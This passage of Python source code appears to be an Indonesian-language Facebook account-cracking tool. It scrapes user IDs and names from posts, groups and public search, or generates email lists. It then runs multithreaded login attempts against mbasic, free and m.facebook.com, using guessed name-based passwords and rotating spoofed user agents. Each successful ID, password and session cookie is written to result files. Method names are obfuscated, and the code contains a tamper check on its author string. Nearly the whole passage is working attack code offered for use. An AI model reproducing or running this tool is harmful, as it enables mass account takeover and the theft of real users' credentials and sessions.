                    else:
                        return 0
                else:
                    print(f"   └─> [yellow]Gagal Dump Dari ID Postingan {PostID} !!!                  ",end="\r");sleep(3.6)
        except (KeyboardInterrupt):
            print(f"   └─> [yellow]KeyboardInterrupt !!                  ",end="\r");sleep(3.6)
            StartCrack()
        StartCrack()
    def ____________________________Author____________________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan ID Postingan, Gunakan Tanda Koma ([bold yellow],[white]) Sebagai Pemisah.\nMisalnya [green]2860305164110035[yellow],[green]2930946803712537.",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        ListID = input(f"   └─> ").split(",")
        for PostID in ListID:
            URl = f"https://mbasic.facebook.com/{PostID}"
            self._____________________________Author_____________________________(URl)
        StartCrack()
    def _____________________________Author_____________________________(self,URL):
        with requests.Session() as r:
            r.cookies.update({"cookie":self.Cookie})
            response = bs(r.get(URL).content,'html.parser')
            for isi in response.find_all("h3"):
                for ids in isi.find_all("a",href=True):
                    if "profile.php" in ids.get("href"):
                        UserID = ids.get("href").split('=')[1].replace("&refid","")
                    else:
                        UserID = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","").split('?')[0]
                    UserName = ids.text
                    Isi = f'{UserID}|{UserName}'
                    if "\\u" in str(UserName):pass
                    elif Isi in Dump:pass
                    else:Dump.append(Isi)
                    print(f"   └─> Sedang Dump ID {UserID}/{len(Dump)}                  ",end="\r");sleep(0.0007)
            for z in response.find_all("a",href=True):
                if "Lihat komentar lainnya…" in z.text or "Lihat komentar sebelumnya…'" in z.text:
                    try:
                        URLNext = "https://mbasic.facebook.com"+z.get["href"]
                        self._____________________________Author_____________________________(URLNext)
                    except:pass
    def ______________________________Author______________________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan ID Grup, Gunakan Tanda Koma ([bold yellow],[white]) Sebagai Pemisah.\nMisalnya [green]876573946992213[yellow],[green]337652255436442.",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        ListID = input(f"   └─> ").split(",")
        for GrupID in ListID:
            URl = f"https://mbasic.facebook.com/groups/{GrupID}"
            self._______________________________Author_______________________________(URl)
        StartCrack()
    def _______________________________Author_______________________________(self,URL):
        try:
            with requests.Session() as r:
                r.cookies.update({"cookie":self.Cookie})
                response = bs(r.get(URL).content,"html.parser")
                for isi in response.find_all("h3"):
                    for ids in isi.find_all("a",href=True):
                        if "profile.php" in ids.get("href"):
                            UserID = ids.get("href").split("=")[1].replace("&eav","")
                            UserName = ids.text
                        else:
                            UserID = ids.get("href").split("/")[1].split("?")[0]
                            UserName = ids.text
                        Isi = f'{UserID}|{UserName}'
                        if "\\u" in str(UserName):pass
                        elif Isi in Dump:pass
                        else:Dump.append(Isi)
                        print(f"   └─> Sedang Dump ID {UserID}/{len(Dump)}                  ",end="\r")
                for x in response.find_all("a",href=True):
                    if "Lihat Postingan Lainnya" in x.text:
                        URLNext = "https://mbasic.facebook.com"+x.get("href")
                        self._______________________________Author_______________________________(URLNext)
        except (KeyboardInterrupt):
            print(f"   └─> [yellow]KeyboardInterrupt !!                  ",end="\r");sleep(3.6)
            StartCrack();exit()
        StartCrack()
    def ________________________________Author________________________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan Username Dari Email Yang Ingin Di Crack\nGunakan Tanda Koma ([bold yellow],[white]) Sebagai Pemisah.\nMisalnya [green]Asep[yellow],[green]Udin[yellow],[green]Melki[yellow],[green]Lina[yellow],[green]Agus[yellow],[green]Gabriel[yellow],[green]Gunawan.",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        ListEmail = input(f"   └─> ").lower().split(",")
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan Jumlah,Batas 50000 Email.",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        TotalEmail = input(f"   └─> ")
        if int(TotalEmail) > 50000:
            print(f"   └─> [yellow]Tidak Boleh Melebihi 5000 !!!                  ",end="\r");sleep(3);__________________Author__________________()
        else:
            self._________________________________Author_________________________________(ListEmail,TotalEmail)
        StartCrack()
    def _________________________________Author_________________________________(self,Username,TotalEmail):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan Domain, Misalnya [green]@gmail.com .",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        Domain = input(f"   └─> ")
        Count = 0
        for PremiumEmail in range(int(TotalEmail)):
            Count+=1
            Name = random.choice(Username)
            ADD = random.randint(11,99)
            if " " in str(Name):
                NameEmail = random.choice([Name.replace(" ",'.'),Name.replace(" ",'')])
                Email = f"{NameEmail}{ADD}{Count}{Domain}"
            else:
                Name = Name
                Email = f"{Name}{ADD}{Count}{Domain}"
            Isi = f'{Email}|{Name}'
            if Isi in Dump:pass
            else:Dump.append(Isi)
            print(f"   └─> Sedang Mengumpulkan {len(Dump)} Email                  ",end="\r");sleep(0.0007)
    def __________________________________Author__________________________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan Jumlah ID Yang Ingin Di Dump",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        TotalID = input(f"   └─> ")
        with ThreadPoolExecutor(max_workers=35) as (V):
            for StartRandom in range(int(TotalID)):
                self.TotalID = int(TotalID)
                V.submit(self.__________________________________Author___________________________________)
        StartCrack()
    def __________________________________Author___________________________________(self):
        with requests.Session() as r:
            FirstName = GenerateName();LastName  = GenerateName();FullName  = f'{FirstName} {LastName}';response = bs(r.get('https://www.facebook.com/public/{}'.format(FullName)).content,'html.parser')
            for hasil in re.findall('<div (.*?)<span>(.*?)</span></a>',str(response)):
                try:UserName = hasil[1];UserID = re.findall(';id&quot;:(.*?),&',str(hasil[0]))[0]
                except:pass
                Isi = f"{UserID}|{UserName}"
                if Isi in Dump:pass
                elif '(' in str(UserName):pass
                else:
                    if int(self.TotalID) == int(len(Dump)) or int(len(Dump)) == int(self.TotalID):break;return 0
                    else:Dump.append(Isi)
                print(f"   └─> Sedang Mengumpulkan {UserID}/{len(Dump)}                  ",end="\r");sleep(0.0007)
    def _____________________________________________________________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan Lokasi File Dump Misalnya [green]/sdcard/folder/file.txt",width=70,subtitle="┌─",subtitle_align='left'),justify="center");Path = input(f"   └─> ")
        try:File = open(Path,'r').read().splitlines()
        except (FileNotFoundError):print(f"   └─> [bold red]Gagal Menemukan File !!");exit()
        for Data in File:ID,Name = Data.split('|')[0],Data.split('|')[1];Dump.append(f'{ID}|{Name}')
class StartCrack:
    def __init__(self):
        self.ok,self.cp,self.loop = 0,0,0;sekarang = f"{tgl}-{bln}-{thn}";self.FileOkName = f"OK-{sekarang}.txt";self.FileCpName = f"CP-{sekarang}.txt";TotalID = len(Dump);Console(style="bold white",width=70).print(panel(f"Jumlah ID Yang Terkumpul {TotalID}",width=70),justify="center");Console(width=70,style="bold white").print(panel(f"""[bold green][[bold white]01[bold green]][bold blue].[bold white]Tambahkan User Agent Manual [white]([red]Not Recommended[white])\n[bold green][[bold white]02[bold green]][bold blue].[bold white]Gunakan User Agent Otomatis [white]([green]Recommended[white])""",width=70,subtitle="┌─",subtitle_align='left'));SetUA = input(f"   └─> ")
        if SetUA in ("1",'01'):Console(width=70,style="bold white").print(panel(f"""Masukan User Agent Anda""",width=70,subtitle="┌─",subtitle_align='left'),justify="center");MyUA = input(f"   └─> ");self.MYUserAgent = MyUA
        else:self.MYUserAgent = ''
        Console(width=70,style="bold white").print(panel(f"""[bold green][[bold white]01[bold green]][bold blue].[bold white]Gunakan Password Lengkap ([green]Nama,Nama12,Nama123,Nama1234,Dll[white])\n[bold green][[bold white]02[bold green]][bold blue].[bold white]Gunakan Password Default ([green]Nama,Nama123,Nama1234,Nama12345[white])\n[bold green][[bold white]03[bold green]][bold blue].[bold white]Gunakan Password Default+Manual""",width=70,subtitle="┌─",subtitle_align='left'));SetPassword = input(f"   └─> ")
        if   SetPassword in ("1",'01'):self.PassSet = ('PassV1')
        elif SetPassword in ("2",'02'):self.PassSet = ('PassV2')
        elif SetPassword in ("3",'03'):self.PassSet = ('PassV3');Console(width=70,style="bold white").print(panel(f"""Masukan Password Tambahan,Gunakan Koma Sebagai Pemisah Misalnya [green]sandi01,sandi12""",width=70,subtitle="┌─",subtitle_align='left'));self.PasswordManual = input(f"   └─> ").split(",")
        else:self.PassSet = ("PassV1")
        Console(width=70,style="bold white").print(panel(f"""[bold green][[bold white]01[bold green]][bold blue].[bold white]Metode Login https://mbasic.facebook.com\n[bold green][[bold white]02[bold green]][bold blue].[bold white]Metode Login https://free.facebook.com ([red]Not Supported Wifi[white])\n[bold green][[bold white]03[bold green]][bold blue].[bold white]Metode Login https://m.facebook.com""",width=70,subtitle="┌─",subtitle_align='left'));SetMetode = input(f"   └─> ")
        if SetMetode in ("1",'01'):self.Metode = ('mbasic')
        elif SetMetode in ("2",'02'):self.Metode = ('free')
        elif SetMetode in ("3",'03'):self.Metode = ("mobile")
        else:self.Metode = ('mbasic')
        self.__main__()
    def __main__(self):
        if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int(int('0094788131'[::-1])):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
        else:
            Console(width=70).print(panel('''[bold green]Semoga Beruntung''',width=70,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Proses Crack [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center')
            with ThreadPoolExecutor(max_workers=30) as (V):
                for Data in Dump:
                    UserID,UserName = Data.split("|")[0],Data.split("|")[1].lower();all = UserName.split(' ');PWV = []
                    if self.PassSet == ("PassV1") or "PassV1" in self.PassSet or self.PassSet in ['PassV1']:
                        if len(all) == 1:frs = all[0];PWV.append(frs);PWV.append(frs+'0123');PWV.append(frs+'01234');PWV.append(frs+'012345');PWV.append(frs+'0123456');PWV.append(frs+'01234567');PWV.append(frs+'012345678');PWV.append(frs+'0123456789');PWV.append(frs+'01234567890');PWV.append(frs+'123');PWV.append(frs+'1234');PWV.append(frs+'12345');PWV.append(frs+'123456');PWV.append(frs+'1234567');PWV.append(frs+'12345678');PWV.append(frs+'123456789');PWV.append(frs+'1234567890');PWV.append('1234567890');PWV.append('123456789');PWV.append(frs+'01');PWV.append(frs+'02');PWV.append(frs+'03');PWV.append(frs+'04');PWV.append(frs+'05');PWV.append('katasandi');PWV.append('sayang123');PWV.append('sayang');PWV.append('kamu nanya');PWV.append(frs+' '+frs);PWV.append('nias123')
                        else:frs = all[0];PWV.append(UserName);UserName = UserName.replace(' ','');PWV.append(UserName);PWV.append(frs+'0123');PWV.append(frs+'01234');PWV.append(frs+'012345');PWV.append(frs+'0123456');PWV.append(frs+'123');PWV.append('1234567890');PWV.append('123456789');PWV.append(frs+'1234');PWV.append(frs+'12345');PWV.append(frs+'123456');PWV.append(frs+'01');PWV.append(frs+'02');PWV.append(frs+'03');PWV.append(frs+'04');PWV.append(frs+'05');PWV.append(frs+' '+frs);PWV.append(UserName+'0123');PWV.append(UserName+'01234');PWV.append(UserName+'012345');PWV.append(UserName+'0123456');PWV.append(UserName+'123');PWV.append(UserName+'1234');PWV.append(UserName+'12345');PWV.append(UserName+'123456');PWV.append(UserName+'01');PWV.append(UserName+'02');PWV.append(UserName+'03');PWV.append(UserName+'04');PWV.append(UserName+'05');PWV.append(frs+'06');PWV.append(frs+'07');PWV.append(frs+'08');PWV.append(frs+'09');PWV.append(frs+'10');PWV.append('katasandi');PWV.append('sayang123');PWV.append('sayangku');PWV.append(UserName+'2009');PWV.append('kamu nanya');PWV.append('nias123');PWV.append(UserName+' '+UserName)
                    elif self.PassSet == ("PassV2") or "PassV2" in self.PassSet or self.PassSet in ['PassV2']:
                        if len(all) == 1:frs = all[0];PWV.append(frs);PWV.append(frs+'123');PWV.append(frs+'1234');PWV.append(frs+'12345');PWV.append('kamu nanya')
                        else:frs = all[0];UserName = UserName.replace(' ','');PWV.append(UserName);PWV.append(frs+'123');PWV.append(frs+'1234');PWV.append(frs+'12345');PWV.append(UserName+'123');PWV.append(UserName+'1234');PWV.append(UserName+'12345');PWV.append('kamu nanya')
                    else:
                        for PWmanual in self.PasswordManual:PWV.append(PWmanual)
                        if len(all) == 1:frs = all[0];PWV.append(frs);PWV.append(frs+'123');PWV.append(frs+'1234');PWV.append(frs+'12345');PWV.append('kamu nanya')
                        else:frs = all[0];UserName = UserName.replace(' ','');PWV.append(UserName);PWV.append(frs+'123');PWV.append(frs+'1234');PWV.append(frs+'12345');PWV.append(UserName+'123');PWV.append(UserName+'1234');PWV.append(UserName+'12345');PWV.append('kamu nanya')
                    if   'mbasic'    in self.Metode: V.submit(self.Mbasic,UserID,PWV)
                    elif 'free'      in self.Metode: V.submit(self.Free,UserID,PWV)
                    elif 'mobile' in self.Metode: V.submit(self.Mobile,UserID,PWV)
                    else:V.submit(self.Mbasic,UserID,PWV)
        Console(width=70).print(panel(f'''[green]Success : {self.ok} [white]| [red]Chekpoint : {self.cp}''',width=70,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Crack Selesai [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center');exit()
    def Mbasic(self,UserID,PWV):
        if '' in self.MYUserAgent or self.MYUserAgent == '':ua = random.choice([UserAgentHTC(),UserAgentSony(),UserAgentRealme(),UserAgentSamsung(),UserAgentVivo(),RandomUa1(),UserAgentXiaomi(),UserAgentLG(),UserAgentNokia(),UserAgentAsus()])
        else:ua = self.MYUserAgent
        with requests.Session() as r:
            speed = 0
            for pw in PWV:
                try:
                    r.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'});response = r.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr');Data = {"lsd":re.search('name="lsd" value="(.*?)"', str(response.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(response.text)).group(1),"uid":UserID,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,};CookieD = (";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items() ]);CookieD+=' m_pixel_ratio=2.625; wd=412x756';Headers = {'Host':'mbasic.facebook.com','cache-control':'max-age=0','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','upgrade-insecure-requests':'1','origin':'https://m.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'XMLHttpRequest','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                    response2 = r.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=Data,headers=Headers,cookies={'cookie':CookieD},allow_redirects=False);speed += 1;print(f"[bold green][[white]{speed}[green]]  ",end="\r")
                    if "c_user" in r.cookies.get_dict().keys():self.ok += 1;cookie=response2.cookies.get_dict();cookie = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ]);Console(width=70).print(panel(f'''User ID  : {UserID}\nPassword : {pw}\nCookie   : {cookie}''',width=70,style='bold green',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]LOGIN SUCCESS [bold cyan]<[bold green]<[bold yellow]<'));open(f'Results/OK/{self.FileOkName}', 'a').write(f'{UserID}|{pw}|{cookie}\n');break
                    elif "checkpoint" in response2.cookies.get_dict().keys():self.cp += 1;Console(width=70).print(panel(f'''User ID    : {UserID}\nPassword   : {pw}\nUser-Agent : {ua}''',width=70,style='bold yellow',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]LOGIN CHEKPOINT [bold cyan]<[bold green]<[bold yellow]<'));open(f'Results/CP/{self.FileCpName}', 'a+').write(f'{UserID}|{pw}\n');break
                    else:continue
                except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):sleep(31)
                except KeyboardInterrupt:continue
        self.loop+=1;print(f'[bold white]      Proses [bold green]{UserID}: [bold white]{self.loop}/{len(Dump)} Ok:-[bold green]{self.ok}[bold white] Cp:-[bold red]{self.cp}[bold white]              ', end='\r')
    def Free(self,UserID,PWV):
        if '' in self.MYUserAgent or self.MYUserAgent == '':ua = random.choice([UserAgentHTC(),UserAgentSony(),UserAgentRealme(),UserAgentSamsung(),UserAgentVivo(),RandomUa1(),UserAgentXiaomi(),UserAgentLG(),UserAgentNokia(),UserAgentAsus()])
        else:ua = self.MYUserAgent
        with requests.Session() as r:
            speed = 0
            for pw in PWV:
                try:
                    r.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                    });response = bs(r.get('https://free.facebook.com/login').content,'html.parser');form = response.find('form',{'method':'post'});Data = {};inp = form.find_all('input')
                    for x in inp:
                        if x.get('name') in ["lsd","jazoest","m_ts","li","try_number","bi_xrwh","unrecognized_tries","login","_fb_noscript"]:Data.update({x.get('name'):x.get('value')})
                    Data.update({'email':UserID,'pass':pw
                    });Headers = {'Host':'free.facebook.com','cache-control':'max-age=0','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','upgrade-insecure-requests':'1','origin':'https://free.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'XMLHttpRequest','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                    response2 = r.post('https://free.facebook.com'+form["action"],data=Data,headers=Headers,allow_redirects=False)
                    speed += 1
                    print(f"[bold green][[white]{speed}[green]]  ",end="\r")
                    if "c_user" in r.cookies.get_dict().keys():self.ok += 1;cookie=response2.cookies.get_dict();cookie = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ]);open(f'Results/OK/{self.FileOkName}', 'a').write(f'{UserID}|{pw}|{cookie}\n');Console(width=70).print(panel(f'''User ID  : {UserID}\nPassword : {pw}\nCookie   : {cookie}''',width=70,style='bold green',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]LOGIN SUCCESS [bold cyan]<[bold green]<[bold yellow]<'));break
                    elif "checkpoint" in response2.cookies.get_dict().keys():self.cp += 1;open(f'Results/CP/{self.FileCpName}', 'a+').write(f'{UserID}|{pw}\n');Console(width=70).print(panel(f'''User ID    : {UserID}\nPassword   : {pw}\nUser-Agent : {ua}''',width=70,style='bold yellow',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]LOGIN CHEKPOINT [bold cyan]<[bold green]<[bold yellow]<'));break
                    else:continue
                except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):sleep(31)
                except KeyboardInterrupt:continue
        self.loop+=1;print(f'[bold white]      Proses [bold green]{UserID}: [bold white]{self.loop}/{len(Dump)} Ok:-[bold green]{self.ok}[bold white] Cp:-[bold red]{self.cp}[bold white]              ', end='\r')
    def Mobile(self,UserID,PWV):
        if '' in self.MYUserAgent or self.MYUserAgent == '':ua = random.choice([UserAgentRealme(),UserAgentSamsung(),UserAgentVivo()])
        else:ua = self.MYUserAgent
        with requests.Session() as r:
            speed = 0
            for pw in PWV:
                try:
                    response = r.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr');Data = {'lsd': re.search('name="lsd" value="(.*?)"',str(response.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(response.text)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"',str(response.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(response.text)).group(1),'try_number': 0,'unrecognized_tries': 0,'email':UserID,'pass':pw,'login':'Masuk','prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': False,'had_password_prefilled': False,'is_smart_lock': False,'bi_xrwh': 0};Headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'};response2 = r.post("https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9",data=Data,headers=Headers);speed += 1;print(f"[bold green][[white]{speed}[green]]  ",end="\r")
                    if "c_user" in r.cookies.get_dict().keys():self.ok += 1;cookie=response2.cookies.get_dict();cookie = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ]);open(f'Results/OK/{self.FileOkName}', 'a').write(f'{UserID}|{pw}|{cookie}\n');Console(width=70).print(panel(f'''User ID  : {UserID}\nPassword : {pw}\nCookie   : {cookie}''',width=70,style='bold green',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]LOGIN SUCCESS [bold cyan]<[bold green]<[bold yellow]<'));break
                    elif "checkpoint" in response2.cookies.get_dict().keys():self.cp += 1;open(f'Results/CP/{self.FileCpName}', 'a+').write(f'{UserID}|{pw}\n');Console(width=70).print(panel(f'''User ID    : {UserID}\nPassword   : {pw}\nUser-Agent : {ua}''',width=70,style='bold yellow',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]LOGIN CHEKPOINT [bold cyan]<[bold green]<[bold yellow]<'));break
                    else:continue
                except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):sleep(31)
                except KeyboardInterrupt:continue
